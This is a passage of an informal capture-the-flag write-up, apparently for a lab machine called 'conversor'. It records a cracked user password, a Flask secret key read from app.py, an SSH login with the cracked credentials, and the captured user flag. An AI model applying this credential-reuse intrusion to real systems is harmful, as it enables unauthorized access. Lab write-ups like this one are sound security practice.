@@ -162,3 +162,64 @@ crackstation . com -> 5b5c3ac3a1c897c94caad48e6c71fdec -> Keepmesafeandwarm
 
 boom now we have the user fismathack and their password Keepmesafeandwarm
 
+exploring more $ cd conversor.htb $ ls app.py app.wsgi instance __pycache__ scripts static templates uploads
+
+cat app.py
+from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
+import os, sqlite3, hashlib, uuid
+
+app = Flask(__name__)
+app.secret_key = 'C0nv3rs0rIsthek3y29'
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_PATH = '/var/www/conversor.htb/instance/users.db'
+
+
+now we have another password that may or may not be handy, app.secret_key = 'C0nv3rs0rIsthek3y29'
+\\now that we have two passwords lets try for SSH 
+
+
+ssh fismathack@10.129.5.50
+The authenticity of host '10.129.5.50 (10.129.5.50)' can't be established.
+ED25519 key fingerprint is SHA256:xCQV5IVWuIxtwatNjsFrwT7VS83ttIlDqpHrlnXiHR8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.129.5.50' (ED25519) to the list of known hosts.
+fismathack@10.129.5.50's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Dec 12 09:22:42 PM UTC 2025
+
+  System load:  0.11              Processes:             222
+  Usage of /:   64.7% of 5.78GB   Users logged in:       0
+  Memory usage: 7%                IPv4 address for eth0: 10.129.5.50
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+
+Last login: Fri Dec 12 21:22:44 2025 from 10.10.16.86
+fismathack@conversor:~$ 
+fismathack@conversor:~$ 
+
+fismathack@conversor:~$ ls
+user.txt
+fismathack@conversor:~$ cat user.txt
+b8b86bf9c6056eaac4577b36c58fbc2a
+fismathack@conversor:~$ 
+first flag done!!
+
+
+
